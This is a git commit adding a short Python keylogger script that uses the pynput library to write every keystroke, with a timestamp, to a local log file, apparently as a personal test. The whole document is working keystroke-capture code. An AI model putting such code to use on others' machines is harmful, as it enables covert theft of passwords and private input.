b174645713d065ade9999ac160d42a34da7595be
MaxAAustin <maa0075@mix.wvu.edu>
2018-08-09 20:46:23 -0400

    Added keylogger and pynput lib successful test

---
+++ python/keylogger/logger.py
@@ -0,0 +1,19 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+# Make a log file
+log_dir = ""
+
+# Format the log
+logging.basicConfig(filename=(log_dir+ "key_log.txt"), level=logging.DEBUG, format= '%(asctime)s: %(message)s')
+
+# Function to monitor keyword inputs 
+
+def on_press(key):
+    logging.info(str(key))
+    if key == Key.esc:
+        return False
+
+# Indicates that listener is on
+with Listener(on_press= on_press) as listener:
+    listener.join()
